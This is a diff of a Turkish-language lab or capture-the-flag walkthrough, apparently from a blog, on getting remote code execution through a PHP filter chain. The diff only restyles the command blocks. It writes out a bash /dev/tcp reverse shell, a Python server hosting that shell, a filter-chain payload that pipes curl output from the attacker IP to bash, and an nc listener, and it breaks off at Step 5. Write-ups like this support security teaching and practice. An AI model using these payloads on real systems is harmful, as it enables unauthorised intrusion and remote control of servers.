@@ -66,32 +66,43 @@ Bizim makinemizde de filter chain dediğimiz yöntemi kullanarak uzaktan kod ça
 **Step 1**
 
 Kali makineme  [https://github.com/synacktiv/php\_filter\_chain\_generator.git](https://github.com/synacktiv/php_filter_chain_generator.git) reposunu kurdum.
+<div class="code-window">
+<br>
+<span class="highlight">nzy@kali$</span> git clone [https://github.com/synacktiv/php\_filter\_chain\_generator.git](https://github.com/synacktiv/php_filter_chain_generator.git)
+</div>
 
-·        git clone [https://github.com/synacktiv/php\_filter\_chain\_generator.git](https://github.com/synacktiv/php_filter_chain_generator.git)
 
 **Step 2**
 
 Kali makinemiz üzerinde “revshell” isimli bir shell oluşturuyoruz.
-
-·        echo 'bash -i >& /dev/tcp/10.9.0.127/4444 0>&1' > revshell
+<div class="code-window">
+<br>
+<span class="highlight">nzy@kali$</span> echo 'bash -i >& /dev/tcp/10.9.0.127/4444 0>&1' > revshell
+</div>
 
 Kurban sistem üzerinden bu oluşturduğumuz shelle bağlanarak uzaktan kod çalıştırmayı gerçekleştireceğiz. O yüzden kendi IP adresimizi (VPN ile bağlandıysanız VPN IP adresinizi) / sembolünden sonra da dinleme yapmak istediğiniz portu seçiyorsunuz. Aynı klasör üstünde python server’ını başlatarak shell’i erişilebilir hale getirelim. <
-
-·        sudo python3 -m http.server 80
+<div class="code-window">
+<br>
+<span class="highlight">nzy@kali$</span> sudo python3 -m http.server 80
+</div>
 
 **Step 3**
 
 Shell’i oluşturup erişilebilir hale getirdikten sonra kurban sistem URL’sine, indirdiğimiz aracı kullanarak filter chain oluşturalım.
-
-·        python3 php\_filter\_chain\_generator.py --chain '<?= \`curl -s -L 10.9.0.127/revshell|bash\` ?>'
+<div class="code-window">
+<br>
+<span class="highlight">nzy@kali$</span> python3 php\_filter\_chain\_generator.py --chain '<?= \`curl -s -L 10.9.0.127/revshell|bash\` ?>'
+</div>
 
 Bunun çıktısındaki uzun satırları kopyalayalım 5. Adımda bu çıktıları kopyalayacağız.
 
 **Step 4**
 
 Dinleyicimizi başlatalım.
-
-·        nc -lvnp 4444
+<div class="code-window">
+<br>
+<span class="highlight">nzy@kali$</span> nc -lvnp 4444
+</div>
 
 **Step 5**
 
